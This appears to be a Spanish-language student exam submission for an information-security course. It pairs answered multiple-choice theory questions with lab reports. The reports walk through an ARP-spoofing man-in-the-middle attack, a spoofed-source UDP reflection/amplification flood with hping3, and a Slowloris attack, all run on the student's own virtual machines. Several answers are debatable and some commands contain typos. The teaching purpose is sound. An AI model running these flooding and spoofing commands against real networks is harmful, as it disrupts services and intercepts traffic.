
# Problema 1

**Pregunta de Teoría (Explicar los nuevos conceptos y justificar su respuesta) 4 puntos**

---

Usted como especialista en seguridad informática de una empresa tiene la responsabilidad de asesorar en materia de seguridad. Su principal interés en capacitar a los empleados de la empresa en el tema de concienciación de seguridad es porque desea que los empleados puedan defenderse de.

a)     La denegación de servicio
b)     El malware
c)     Ingeniería social
d)     Botnets


> [!important] Respuesta: c) Ingeniería social.
> A diferencia de las otras opciones, la ingeniería social ataca a las personas , no a las máquinas por lo que los entes vulnerables son los trabajadores. Por tanto un especialista en seguridad debe capacitar a los empleados de la empresa para que tampoco sean un punto vulnerable de ataques
> 

---

¿Qué protocolo de configuración de red es utilizado para proporciona información de configuración a los hosts de la red, en particular las direcciones IP de los resolutores DNS de caché locales, los servidores de arranque de red y otros hosts de servicio?

a)     DHCP (Dynamic Host Configuration Protocol)
b)     NIS (Network Information Service)
c)     DNS (Domain Name Service)
d)     LDAP (Lightweight Directory Access Protocol)


>[!important] Respuesta: a) DHCP
>DHCP ya que asigna direcciones IP dinámicamente,  máscaras de subred, gateways, servidores DNS y parámetros de arranque cuando un cliente se conecta a la red.

---

¿Cuál de las siguientes listas muestra la secuencia correcta de las capas del modelo de interconexión de sistemas abiertos (OSI), empezando por la capa más cercana al usuario final?

a)     Aplicación, sesión, red y física
b)     Aplicación, red, sesión y física
c)     Presentación, red, transporte y físico
d)     Transporte, presentación, red y físico



>[!important] Respuesta: a) Aplicación, sesión, red y física.
>El modelo OSI esta formado por 7 capas:
>1. Capa Física
>2. Capa de Enlace de Datos
>3. Capa de Red
>4. Capa de Transporte
>5. Capa de Sesión
>6. Capa de Presentación
>7. Capa de Aplicación.
>
> La capa más 'cercana' al usuario es la capa de aplicación, por lo que la opción a) tiene el orden correcto. 


---

¿Cómo se puede prevenir una vulnerabilidad de desbordamiento de búfer?

a)     Utilizando listas negras que contengan todos los caracteres que puedan ser potencialmente dañinos y no permitiéndolos en la función

b)     Instalando parches para corregir las vulnerabilidades de desbordamiento del búfer

c)     Programando con C++ en lugar de C porque C++ no es vulnerable a los desbordamientos de búfer como C

d)     Utilizando lenguajes de programación fuertemente tipados, implementando la comprobación de límites y entradas, y utilizando funciones de almacenamiento



>[!important] Respuesta: d) Utilizando lenguajes de programación fuertemente tipados, 
> Con ello garantizamos en tiempo de desarrollo que punteros o índices nunca excedan el tamaño del búfer y se valide toda la entrada externa. Además
> - Las listas negras son frágiles
> - Los parches solo solucionan errores conocidos, no previene nuevos errores.
> - C++ sigue permitiendo punteros sin seguridad. (Rust es el futuro jeje)


---

Un control eficaz contra los ataques de inyección en lenguaje de consulta estructurado (SQL) es

a)     Implementar un software antivirus
b)     Validar el ingreso de datos del usuario
c)     Cifrar las comunicaciones utilizando la seguridad de la capa de transporte (TLS)
d)     Desplegar un sistema de prevención de intrusiones


>[!important] Respuesta b) Validar el ingreso de datos del usuario.
>Como sabemos la Inyección SQL explota la concatenación de entrada no confiable en consultas. Si usamos sentencias preparadas como **queries parametrizadas** o un tipo de validación y escape riguroso de entradas, estaríamos realizando una mejor práctica. Las demás opciones no previenen el riesgo de inyección sql.


---

Cinco (5) ejemplos de soluciones exitosas para evitar el robo incluyen

a)     Estrictos controles de acceso, sistemas de detección de intrusos, puertos bloqueados, control de claves y control de bag
b)     Estrictos controles de acceso, software antiphishing, puertos bloqueados, control de claves y control de bag
c)     Identificación y autenticación, sistemas de detección de intrusos, puertos bloqueados, control de claves y comprobación de bag.
d)     Identificación y autenticación, software antiphishing, puertos bloqueados, control de claves y comprobación de bag


>[!important] Respuesta c)
>Para evitar robos requerimos controles mixtos. 
>- La **identificación y autenticación** nos permiten asegurar que solo personas autorizadas tengan acceso.
>- Un **IDS** detectaría intentos de acceso no autorizado
>- El **bloqueo de puertos** evitaría conexiones de dispositivos no autorizados
>- El **control de claves** y **comprobación de bag** definirían areas más seguras e impedimento de la salida de datos sensibles respectivamente.


---

¿Que función cumple un auditor?

a)     El auditor comprueba la eficacia de los controles implementados por la organización en términos de diseño, aplicación y realiza los cambios necesarios
b)     El auditor se asegura que los controles cumplen con el COBIT (Objetivos de Control para TI)
c)     El auditor comprueba que los controles cumplen con la norma ISO (Organización Internacional de Normalización) 27001:2005, Anexo A (Sección de Controles)
d)     El auditor compara la política declarada con los controles reales existentes


>[!important] Respuesta: d)
>El auditor es un agente externo, solo verifica que las políticas y procedimientos declarados se implementen y funcionen.


---

La persona con la mayor responsabilidad para establecer los niveles de clasificación y el cumplimiento de los controles de acceso de cada activo de información sensible es el

a)     El responsable local
b)     Auditor
c)     Propietario de la información
d)     Individuo


>[!important] Respuesta: c)
>Es la persona que conoce el contexto y decide la sensibilidad y el tratamiento (ya sea público, interno o confidencial)


----

Si existen registros históricos almacenados en el servidor y son extremadamente importantes para la empresa, si dichos registros nunca deben ser modificados. ¿Qué control puede añadir?

a)     Hashing
b)     ACLs
c)     Atributos de sólo lectura
d)     Firewall


>[!important] Respuesta: a) Hashing
>El hashing crea una clave única relacionada con el contenido al cual esta asociado. Como en los objetos de Git. Por tanto cualquier cambio modificaría el hash invalidando la comprobación.


---

El administrador de red comienza a experimentar síntomas de lentitud en la red. Al investigar, se da cuenta que la red está siendo bombardeada con paquetes TCP SYN, por este motivo cree que su organización es víctima de un ataque de denegación de servicio. ¿Qué principio de seguridad de la información se está se está violando?

a)     Disponibilidad
b)     Integridad
c)     Confidencialidad
d)     Negación


>[!important] Respuesta: a) Disponibilidad
> La disponibilidad asegura que los usuarios autorizados accedan a los servicios cuando lo necesiten. Un ataque DoS 'bloquea' la disponibilidad de los servicios, agota los recurso y niega conexiones legítimas.


----


¿Cuál es el último paso de un análisis cuantitativo de la gestión de riesgo?

a)     Determinar el valor de los activos.
b)     Evaluar la tasa de ocurrencia anualizada.
c)     Derivar la expectativa de pérdida anualizada.
d)     Realizar un análisis costo/beneficio.


>[!important] Respuesta: d) Realizar un análisis costo/beneficio
> Primero se debe identificar y valorar los activos. Luego determinar la tasa de ocurrencia de las amenazas. Luego se debe calcular una expectativa de pérdida y por último se debe realizar una análisis costo/beneficio para evaluar si es necesario gestionar una defensa.


---

¿Cuál de las siguientes alternativas es el proceso de identificar, reducir los riesgos a niveles controlables y luego implementar controles para mantener los riesgos en ese nivel?

a)    Retorno de la inversión
b)    Riesgo
c)    Análisis de riesgos
d)    Gestión de riesgos

>[!important] Respuesta: d)
>La gestión de riesgo abarca tanto la **identificación**, **análisis**, **mitigación**, **seguimiento** y **revisión**.


---

¿Cuáles de las siguientes alternativas serian buenas razones para el uso de entornos virtualizados? (Elija dos respuestas correctas).

a)    Reducir la necesidad de equipos
b)    Reducción del riesgo de amenazas
c)    Capacidad de aislar las aplicaciones
d)    Capacidad de almacenar entornos en dispositivos USB


>[!important] Respuesta : a) y c)
>- Varios VMs en un solo host físico disminuyen el número de servidores
>- Las VMs aíslan procesos, por tanto, un huésped comprometido no afecta a otros tan fácilmente.
>- Para la opción b) no necesariamente reduce el riesgo de amenazas y para la opción d) consider que es una ventaja menor.


---

Seleccione las respuestas correctas sobre las políticas recomendadas para las cuentas con contraseña.

a)    Hacer que la longitud de la contraseña sea de al menos ocho caracteres y exigir el uso de letras mayúsculas, minúsculas, números y caracteres especiales
b)    Exija a los usuarios que cambien las contraseñas cada 60 o 90 días
c)    Bloquee las cuentas de los usuarios después de uno o dos intentos fallidos de inicio de sesión
d)    Configure el servidor para que no permita a los usuarios utilizar la misma contraseña una y otra vez


>[!important] Respuesta : a), c) y d)
>


---

Para evaluar los activos, ¿cuál de los siguientes factores debe tenerse en cuenta? (Elija tres.)

a)    El costo de reposición
b)    Su valor para la competencia
c)    Su valor para la organización
d)    Su valor de recuperación

>[!important] Respuesta : a), c) y d)
>La opción b) no es una métrica que se toma en cuenta para la evaluación interna de riesgos.


---

¿Cuál es el método que comúnmente se utiliza en un programa antivirus?

a)    Comprobación de la integridad
b)    Escaneo
c)    Heurística
d)    Métrica


>[!important] Respuesta : b) Escaneo
>Principalmente es el escaneo ya que las heurísticas son complementarias

---

¿Qué estrategia de gestión de riesgos realiza cuando adquiere un seguro para cubrir los costos de una posible pérdida de datos?

a)    Aceptar el riesgo
b)    Eliminar el riesgo
c)    Mitigar el riesgo
d)    Transferir el riesgo


>[!important] Respuesta : d) Transferir el riesgo
>Cuando adquiero un seguro estoy transfiriendo el riesgo a la aseguradora, esto lo hago pagando una prima de seguro

---

Un desarrollador añadió una subrutina a una aplicación web encargada de comprobar si la fecha es el 1 de abril, si lo es, cambia aleatoriamente los saldos de las cuentas de los usuarios. ¿Qué tipo de código malicioso es este?

a)    Logic bomb
b)    Worm
c)    Trojan horse
d)    Virus

>[!important] Respuesta: a)
>Una **logic bomb** es un código que permanece inactivo hasta que se cumple una condición. Ese es el caso mostrado. Los **worm/virus** se replican y tampoco es un **troyano**.


-----


Configuración inicial: 

Para cada máquina virtual (Kali, CentOS para servidor y cliente)
- Red: Red interna
- Modo promiscuo: Permitir todo

<img src="imgs-parcial/Pasted image 20250524231053.png" >

> [!warning] Antes de ello primero debemos ejecutar los siguientes comando para cada máquina CentOS.

```sh
sudo su -
```

Y procedí a seguir los pasos de la guía brindada para actualizar los repositorios de instalación para CentOS:

```sh
sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
sed -i 's|mirrorlist=|#mirrorlist=|g' /etc/yum.repos.d/CentOS-*
```

Por ultimo, actualizar el sistema (Para ello primero mantuve la red en NAT)
```sh
yum update -y
```

Una vez hecho esto, recién cambie a `red interna` para las máquinas CentOS

Estas son las muestras tras ejecutar los comandos  para actualizar los repositorios de instalación:


<img src="imgs-parcial/Pasted image 20250525140912.png" >

<img src="imgs-parcial/Pasted image 20250525140932.png" >


-----

# Problema 3

Realizar una demostración del ataque de hombre en el medio en un entorno controlado utilizando el ejemplo realizado en clase. El alumno debe presentar un informe detallado, capturando evidencias de los pasos realizados hasta demostrar el éxito del ataque. 4pts.



## A. Configuración de la Victima Servidor(Centos-8-Server)

### 1. Instalé un servidor web 

Configuré la máquina al tipo de red NAT (para la instalación).
```sh
sudo yum install httpd -y
```

<img src="imgs-parcial/Pasted image 20250525145815.png" >


### 2. Inicié el servidor web y lo habilité para que inicie con el sistema

```sh
sudo systemctl start httpd
sudo systemctl enable httpd
sudo systemctl status httpd
```

<img src="imgs-parcial/Pasted image 20250525145945.png" >


### 3. Creé una página web simple. 

```sh
echo "Hola desde CentOS_Servidor - Si ves esto, el MitM NO esta funcionando aun." | sudo tee /var/www/html/index.html
```


### 4. Obtuve la `IP` del CentOS-Servidor

Al volver a configurar el tipo de red como `red interna` en la máquina servidor y ejecutar el comando `ip a` me di con la sorpresa de no hallar  ninguna`ip` parala interfaz `enp0s3` por lo que asigné una `ip` manualmente mediante los siguientes comandos:

```sh
sudo nmcli con mod "enp0s3" ipv4.addresses 10.0.2.12/24
sudo nmcli con mod "enp0s3" ipv4.method manual
sudo nmcli con up "enp0s3"
```

<img src="imgs-parcial/Pasted image 20250525152913.png" >

> [!info] La `ip` de la máquina servidor CentOS es `10.0.2.12`


## B. Configuración de la Víctima cliente (CentOS-cliente)

### 1. Obtuve la dirección `ip` del cliente CentOS

De igual manera para la máquina CentOS cliente

<img src="imgs-parcial/Pasted image 20250525153548.png" >
<img src="imgs-parcial/Pasted image 20250525160456.png" >


> [!info] La `ip` de la máquina cliente CentOS es  `10.0.2.11`


## 2. Verifiqué conectividad con CentOS servidor

Al realizar `ping` hacia el servidor CentOS no tuve inconvenientes, per al realizar 

```sh
curl http://10.0.2.12
```

Me salió el error:

>[!error] curl: (7) Failed to connect to 10.0.2.12 port 80: No route to host


Lo cual lo solucioné desactivando el firewall tanto en el cliente como en le servidor con

```sh
sudo systemctl stop firewalld
```


## C. Configuración y Ejecución del Ataque en Kali Linux (Atacante)

## 1. Obtuve la dirección  `ip` de Kali Linux

Al igual que en las máquinas CentOS servidor y cliente, para Kali me encontré que no tenía asignado una `ip`. Asumí que debe ser por la configuración de red en `red interna`. Así que procedí a asignarla manualmente también:

Ejecuté los comandos:

```sh
sudo ip addr add 10.0.2.10/24 dev eth0
sudo ip link set eth0 up
```


<img src="imgs-parcial/Pasted image 20250525160053.png" >

> [!info] La `ip` de la máquina servidor CentOS es  `10.0.2.10`


### 2. Instalar `dsniff`

Ya se encontraba instalado por defecto en Kali

<img src="imgs-parcial/Pasted image 20250525163446.png" >

### 3. Habilité el reenvío de IP (IP Forwarding)

```sh
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# Para verificar:
cat /proc/sys/net/ipv4/ip_forward
```


<img src="imgs-parcial/Pasted image 20250525163949.png" >

### 4. Ejecuté el ARP Spoofing

Para esto necesite 2 terminales Kali Linux:

**Primer terminal**

Envenené ARP de cliente a servidor
```sh
sudo arpspoof -i eth0 -t 10.0.2.11 10.0.2.12
```


**Segundo terminal**
Envenené ARP de servidor a clientekali
```sh
sudo arpspoof -i eth0 -t 10.0.2.12 10.0.2.11
```

<img src="imgs-parcial/Pasted image 20250525165916.png" >


### 5. Captura de tráfico

Para ello use **Wireshark** y **tcpdump**

Con **Wireshark**

Ejecuté el comando
```sh
sudo wireshark
```

Luego elegí la interfaz de red `eth0`: 
Podemos observar el flujo capturado de `10.0.2.12` a `10.0.2.11`

<img src="imgs-parcial/Pasted image 20250525170145.png" >


## D. Verificación del ataque

### 1. Desde CentOS cliente intenté acceder al servidor web nuevamente

>[!tip] Aunque el mensaje diga que "el MitM No esta funcionando aun" en realidad si estaba, ya que solo es el texto que pusimos por defecto en la página web que levanta el servidor. Podemos validar el ataque con las siguientes capturas.

<img src="imgs-parcial/Pasted image 20250525164836.png" >

### 2. Pude observar el tráfico en Kali (con **tcpdump**)

<img src="imgs-parcial/Pasted image 20250525165312.png" >


## E. Detener el ataque

Para **Wireshark**

<img src="imgs-parcial/Pasted image 20250525170539.png" >

**Para detener el ARP Spoofing**

<img src="imgs-parcial/Pasted image 20250525170619.png" >

Para el **tcpdump**

<img src="imgs-parcial/Pasted image 20250525170638.png" >

**Por último deshabilité el reenvío de IP en Kali.**

<img src="imgs-parcial/Pasted image 20250525170806.png" >


>[!important] Con esto finalicé el Problema 3


---


# Problema 4

Realizar una demostración del ataque de denegación de servicio Reflector/Amplificador en un entorno controlado utilizando el ejemplo realizado en clase. El alumno debe presentar un informe detallado, capturando evidencias de los pasos realizados hasta demostrar el éxito del ataque. 4pts.


## Configuraciones previas


>[!important] Aclaro que este fue el ultimo problema que resolví por si se generar dudas al evaluar el paso a paso en mis resoluciones

### Validar que `hping3` este instalado en Kali

```
hping3 --version
```

<img src="imgs-parcial/Pasted image 20250525220625.png" >

### Restablecer la configuración de red
Para la máquina victima y la máquina reflector/amplificador (antiguamente servidor y cliente respectivamente en los problemas 3 y 5).

```sh
sudo nmcli con mod "enp0s3" ipv4.method auto
sudo nmcli con mod "enp0s3" ipv4.addresses ""
sudo nmcli con down "enp0s3" && sudo nmcli con up "enp0s3"
```


### Instalación de `netcat` para la máquina víctima

Ejecuté el siguiente comando para instalar `netcat`

```sh
sudo yum install nc -y # Si no está instalado
```

<img src="imgs-parcial/Pasted image 20250525222733.png" >


### Instalación de `socat` para la máquina reflector/amplificador

Para ello ejecuté el comando

```sh
sudo yum install socat -y
```

<img src="imgs-parcial/Pasted image 20250525223404.png" >



### Instalación de tcpdump tanto para la máquina víctima como reflector/amplificador

```sh
sudo dnf update -y
sudo dnf install tcpdump -y
```


<img src="imgs-parcial/Pasted image 20250525233607.png" >


### Configuración de `ip` manual para máquina victima y máquina reflector/amplificador

Luego ejecute nuevamente la serie de comandos para asignar manualmente `ip` dada mi configuración de red en **red interna** :

```sh
sudo nmcli con mod "emp8s3" ipv4.addresses 10.0.2.xx/24
sudo nmcli con mod "emp8s3" ipv4.method manual
sudo nmcli con up "emp8s3"
```

> [!info] La `ip` de la máquina víctima CentOS es `10.0.2.30`

<img src="imgs-parcial/Pasted image 20250525224246.png" >

> [!info] La `ip` de la máquina reflector/amplificador CentOS es `10.0.2.20`

<img src="imgs-parcial/Pasted image 20250525224231.png" >


## A. Configuración de la víctima

	
### 1. Puse a `netcat` a escuchar en un puerto UDP

Esto lo hice para observar el tráfico entrante

Ejecuté el comando:
```sh
nc -lvup 12345
```

Y obtuve la salida
<img src="imgs-parcial/Pasted image 20250525224933.png" >


## B. Configuración del reflector/amplificador

### 1. Cree un archivo con una respuesta grande
Para la simulación de amplificación. Para ello ejecuté el comando:

```sh
echo "RESPUESTA AMPLIFICADA: $(head -c 500 /dev/urandom | base64)" > /tmp/respuesta_amplificada.txt
```


<img src="imgs-parcial/Pasted image 20250525225647.png" >



### 2. Configuré el servicio reflector/amplificador con `socat`

Con este comando hice que `socat` escuche en el puerto `UDP 7777`. Así cuando reciba un paquete, enviará el contenido de `respuesta_amplificada.txt` de vuelta al remitente original del paquete.

Par ello ejecuté el comando:

```sh
sudo socat -u UDP-LISTEN:7777,fork EXEC:'cat /tmp/respuesta_amplificada.txt | socat - UDP-DATAGRAM:${SOCAT_PEERADDR}:${SOCAT_PEERPORT}'
```

Con esto, se dejo abierto el terminal:

<img src="imgs-parcial/Pasted image 20250525230349.png" >




## C. Configuración y ejecución del atacante


### 1. Verifique conectividad

Tanto para la máquina reflector como para la máquina victima haciendo ping

```sh
ping -c 4 10.0.2.20
ping -c 4 10.0.2.30
```

<img src="imgs-parcial/Pasted image 20250525231233.png" >


### 3. Lancé el ataque DRDoS con  `hping3`

Ejecuté el siguiente comando

```sh
sudo hping3 --flood --udp -s 12345 -p 7777 -a 10.0.2.30 10.0.2.20 --data 10
```

Muestra:

<img src="imgs-parcial/Pasted image 20250526000131.png" >


## D. Monitoreo y evidencia

Para validar que los paquetes llegan a la victima del reflector ejecuté el comando:

```sh
sudo tcpdump -i <interfaz_victima> udp port 12345 -n -vv -A
```

Muestra: 
<img src="imgs-parcial/Pasted image 20250525235456.png" >

A su vez validé los envíos de Kali con

```sh
sudo tcpdump -i <interfaz_kali> host 10.0.2.20 and udp port 7777 -n -vv
```

Muestra: 
<img src="imgs-parcial/Pasted image 20250525235747.png" >


>[!important] Con esto finalicé el Problema 4



---

# Problema 5

Realizar una demostración del ataque **Slowloris** en un entorno controlado utilizando el ejemplo realizado en clase. El alumno debe presentar un informe detallado, capturando evidencias de los pasos realizados hasta demostrar el éxito del ataque. 4pts.


Para este caso usé

- Maquina atacante (Kali) `ip 10.0.2.10`
- Maquina Servidor víctima (CentOS) `ip 10.0.2.12`
- Maquina CentOS (para realizar algunas consultas) `ip 10.0.2.11`

El proceso se ejecutó con las máquinas dentro de una **red interna**.


----

## Configuraciones previas

### 1. `slowhttptest` para ejecutar el ataque

<img src="imgs-parcial/Pasted image 20250525185438.png" >

### 2. Configuración de una `ip` manual

Cuando volví a iniciar la máquina virtual Kali esta ya no tenía configurada la `ip` `10.0.2.10`. Al ejecutar los comandos usuales 

```sh
sudo ip addr add 10.0.2.10/24 dev eth0
sudo ip link set eth0 up
```

Seguía sin aparecerme la `ip` al ejecutar `ip a`. Por lo que acudí a los siguientes comandos:

```sh
sudo nmcli con mod "Wired connection 1" ipv4.addresses 10.0.2.10/24
sudo nmcli con mod "Wired connection 1" ipv4.method manual
sudo nmcli con up "Wired connection 1"
```

Con ello pude continuar satisfactoriamente

<img src="imgs-parcial/Pasted image 20250525203127.png" >




---


## A. Configuración del Servidor Web Víctima (CentOS)

### 1. Instalación Apache

Usé la misma máquina servidor CentOS para el problema 3.

### 2. Iniciar y habilitar Apache

Simplemente ejecuté el comando `sudo systemclt status httpd` ya que las configuraciones necesarias para que se levante el servidor web lo realicé en el problema 3.

<img src="imgs-parcial/Pasted image 20250525180444.png" >

### 3. Obtener la IP

Para ello abrí otro terminal usando la combinación de teclas `Ctrl + Alt + F2`. Luego ejecuté el comando `ip a` y obtuve

<img src="imgs-parcial/Pasted image 20250525180713.png" >


> [!info] La `ip` de la máquina servidor CentOS es  `10.0.2.12`


### 4. Verificar que el servidor web funciona

Tuve que volver a desactivar el firewall para la maquina servidor y la maquina que hará la consulta (la otra máquina CentOS de soporte)

```sh
sudo systectl stop firewalld
```

Luego ejecuté el comando

```sh
curl http://10.0.2.12
```

Y obtuve 

<img src="imgs-parcial/Pasted image 20250525181636.png" >

Por lo que **el servidor web funciona**.


## B. Desactivar SYN Cookies en la máquina servidor CentOS

### 1. Editar `etc/sysctl.conf`

Procedí a editar el archivo con `vi` ya que era la única opción disponible.
Añadí la línea `net.ipv4.tcp_syncookies` y la establecí a `0`.

<img src="imgs-parcial/Pasted image 20250525182903.png" >


## 2. Aplicar los cambios

```sh
sudo sysctl -p
sysctl net.ipv4.tcp_syncookies
```

<img src="imgs-parcial/Pasted image 20250525185757.png" >

## C. Configuración y Ejecución del Ataque en Kali Linux (atacante)

### 1. Lanzar el ataque Slowloris

Ejecuté el comando:

```sh
slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://10.0.2012/ -x 24 -p 3
```

> [!info] En realidad realicé 3 ataques con distinto valores para el número de conexiones a establecer.
> - `-c 1000`
> - `-c 2000`
> - `-c 4000`


## D. Monitoreo y evidencia de éxito
### 1. Para `-c 1000`

En el terminal Kali
<img src="imgs-parcial/Pasted image 20250525195939.png" >

<img src="imgs-parcial/Pasted image 20250525200040.png" >

En otra máquina CentOS en la última línea al ejecutar `curl http://10.0.2.12` tardo más de 30 segundos en responder:

<img src="imgs-parcial/Pasted image 20250525200341.png" >

Validé el número total de conexiones con

```sh
sudo netstat -an | grep ":80" | wc -l
```

<img src="imgs-parcial/Pasted image 20250525200414.png" >

Y el estado de las conexiones con:

```sh
sudo netstat -an | grep ":80" | aw '{print $6}' | sort uniq -c
```

<img src="imgs-parcial/Pasted image 20250525200848.png" >


### 2. Para `-c 4000`

<img src="imgs-parcial/Pasted image 20250525201158.png" >


<img src="imgs-parcial/Pasted image 20250525201228.png" >

Tambien monitoree los proceso de Apache con

```sh
ps aux | grep httpd | grep -v grep | wc -l
```

<img src="imgs-parcial/Pasted image 20250525205408.png" >
### 3. Reporte 

Por ultimo, estos son los reportes (del último ataque)

Use el navegador Firefox para visualizar el reporte:

```sh
firefox slowloris_stats.html
```

<img src="imgs-parcial/Pasted image 20250525202551.png" >


>[!important] Con esto finalicé el Problema 5


